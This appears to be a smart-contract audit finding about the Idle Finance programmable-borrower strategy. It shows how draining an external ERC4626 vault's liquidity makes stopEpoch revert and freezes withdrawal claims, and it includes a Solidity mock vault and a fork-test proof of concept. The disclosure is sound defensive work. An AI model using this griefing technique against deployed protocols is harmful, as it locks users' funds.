### Title
ERC4626 liquidity failures can indefinitely block epoch settlement and withdrawal claims - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
A programmable-borrower epoch cannot be stopped when its ERC4626 vault is economically solvent but temporarily unable to return underlying liquidity. `ProgrammableBorrower.onStopEpoch` converts a failed `vault.withdraw` into `StopEpochVaultLiquidityUnavailable`, and `IdleCDOEpochVariant._stopEpoch` lets that revert propagate before the borrower-default path can run. [1](#0-0) [2](#0-1) 

### Finding Description
At epoch end, `IdleCDOEpochVariant` asks the programmable borrower to source `_amountToPullFromBorrower + _pendingWithdraws`. [3](#0-2) 

`ProgrammableBorrower` checks whether the shortfall is covered by the vault-share valuation, then calls `vault.withdraw(shortfall, address(this), address(this))`. [4](#0-3) 

If the vault has enough share value but insufficient immediately withdrawable assets, the external call reverts and the catch block reverts with `StopEpochVaultLiquidityUnavailable`. [5](#0-4) 

Because `IdleCDOEpochVariant` invokes the hook inside `if (!IProgrammableBorrower(...).onStopEpoch(...))`, this revert bubbles out of `stopEpoch` rather than reaching `_handleBorrowerDefault`. [6](#0-5) 

An unprivileged user of the underlying ERC4626 venue can create this state by borrowing or otherwise consuming all currently liquid underlying assets while leaving the vault’s shares backed by outstanding positions. [7](#0-6) [8](#0-7) 

Every subsequent manager call to `stopEpoch` reverts while that liquidity remains unavailable, leaving `isEpochRunning` true and `pendingWithdraws` unfunded. [9](#0-8) [10](#0-9) 

### Impact Explanation
The direct impact is temporary freezing of all funds needed for the stop call, quantified as `_amountToPullFromBorrower + _pendingWithdraws`. [11](#0-10) 

For ordinary stops this freezes funded withdrawal receipts and prevents the epoch from transitioning back to the buffer state. [12](#0-11) 

Pending receipt holders cannot claim while the epoch is running because `_claimFundedWithdrawRequest` reverts when `epochEndDate != 0` and the request epoch has not completed. [13](#0-12) 

For a pool-close stop (`_interest == 1`), `_expectedInterest` is increased by all borrowed principal, so an external-vault liquidity failure can freeze the entire LP principal rather than only pending receipts. [14](#0-13) 

The freeze persists until the ERC4626 vault regains enough withdrawable liquidity; if the attacker keeps borrowed liquidity outstanding, the freeze can be extended indefinitely without control of any privileged Idle role. [1](#0-0) 

### Likelihood Explanation
The attack requires the external vault to remain share-solvent while its withdrawable underlying balance is exhausted, a normal condition for lending-style ERC4626 vaults whose assets are deployed into borrower markets. [15](#0-14) 

An unprivileged vault-market participant can borrow available liquidity immediately before the manager calls `stopEpoch`, and can repeat the condition by maintaining the borrow. [1](#0-0) 

The production tests already exercise this exact branch by limiting external-vault liquidity below `pendingWithdraws`; the result is a revert, `defaulted == false`, `isEpochRunning == true`, and unchanged `pendingWithdraws`. [16](#0-15) 

### Recommendation
Do not let an ERC4626 liquidity revert leave the epoch in an indefinitely retry-only state. [5](#0-4) 

Add a non-reverting fallback that withdraws whatever liquidity is available, returns control to `IdleCDOEpochVariant`, and lets the existing underfunded `transferFrom`/default path classify the remaining shortfall. [17](#0-16) [18](#0-17) 

If immediate default is considered too aggressive for a solvent-but-illiquid vault, add an explicit grace-period mechanism after which the manager can force underfunded settlement or default instead of repeatedly calling a reverting `stopEpoch`. [6](#0-5) 

The implementation should not rely solely on `maxWithdraw`, because the existing regression test documents a real deployed ERC4626 whose `maxWithdraw` reports zero even though withdrawal later succeeds. [19](#0-18) 

### Proof of Concept

```solidity
contract BorrowableLiquidityVault is ERC20 {
    IERC20Detailed public immutable assetToken;
    IERC20Detailed public immutable collateralToken;
    uint256 public lent;
    mapping(address => uint256) public collateral;

    constructor(address _asset, address _collateral)
        ERC20("Borrowable Vault", "bvUSDC")
    {
        assetToken = IERC20Detailed(_asset);
        collateralToken = IERC20Detailed(_collateral);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalManagedAssets() public view returns (uint256) {
        // Outstanding loans remain vault assets even though they are not liquid.
        return assetToken.balanceOf(address(this)) + lent;
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        if (supply == 0) return shares;
        return shares * totalManagedAssets() / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 managed = totalManagedAssets();
        uint256 supply = totalSupply();
        shares = supply == 0 || managed == 0
            ? assets
            : assets * supply / managed;
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address owner_
    ) external returns (uint256 shares) {
        // Only cash is withdrawable; lent assets are still share backing.
        require(
            assetToken.balanceOf(address(this)) >= assets,
            "insufficient-liquidity"
        );
        shares = _toSharesRoundUp(assets);
        if (msg.sender != owner_) _spendAllowance(owner_, msg.sender, shares);
        _burn(owner_, shares);
        assetToken.transfer(receiver, assets);
    }

    function lockCollateral(uint256 amount) external {
        collateral[msg.sender] += amount;
        collateralToken.transferFrom(msg.sender, address(this), amount);
    }

    function borrowAllCash() external {
        uint256 amount = assetToken.balanceOf(address(this));
        // The attacker supplies more collateral than borrowed cash.
        require(collateral[msg.sender] >= amount * 2, "no-collateral");
        lent += amount;
        assetToken.transfer(msg.sender, amount);
    }

    function _toSharesRoundUp(uint256 assets)
        internal
        view
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();
        uint256 managed = totalManagedAssets();
        if (supply == 0 || managed == 0) return assets;
        shares = assets * supply / managed;
        if (shares * managed < assets * supply) shares += 1;
    }
}
```

```solidity
function testFork_PublicVaultBorrowerBlocksStopEpoch() external {
    // Mainnet fork provides the real USDC token.
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    BorrowableLiquidityVault externalVault =
        new BorrowableLiquidityVault(USDC, WETH);

    _setUpProgrammableBorrowerCreditVault(
        FORK_BLOCK,
        address(externalVault)
    );

    uint256 amount = 10_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(amount);

    uint256 requested = cdoEpoch.requestWithdraw(
        aaTranche.balanceOf(address(this)) / 2,
        address(aaTranche)
    );
    assertGt(requested, 0);

    _startEpochAndCheckPrices(0);
    assertGt(
        externalVault.balanceOf(address(programmableBorrower)),
        0
    );

    // An unprivileged user of the ERC4626's lending market borrows all cash.
    address vaultUser = makeAddr("vault-liquidity-user");
    uint256 cash = IERC20Detailed(USDC).balanceOf(address(externalVault));
    deal(WETH, vaultUser, cash * 2);

    vm.startPrank(vaultUser);
    IERC20Detailed(WETH).approve(address(externalVault), cash * 2);
    externalVault.lockCollateral(cash * 2);
    externalVault.borrowAllCash();
    vm.stopPrank();

    // The programmable borrower's shares still cover the shortfall.
    assertGt(
        externalVault.convertToAssets(
            externalVault.balanceOf(address(programmableBorrower))
        ),
        strategy.pendingWithdraws()
    );

    vm.warp(cdoEpoch.epochEndDate() + 1);

    vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertTrue(cdoEpoch.isEpochRunning());
    assertFalse(cdoEpoch.defaulted());
    assertEq(strategy.pendingWithdraws(), requested);

    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    cdoEpoch.claimWithdrawRequest();
}
```
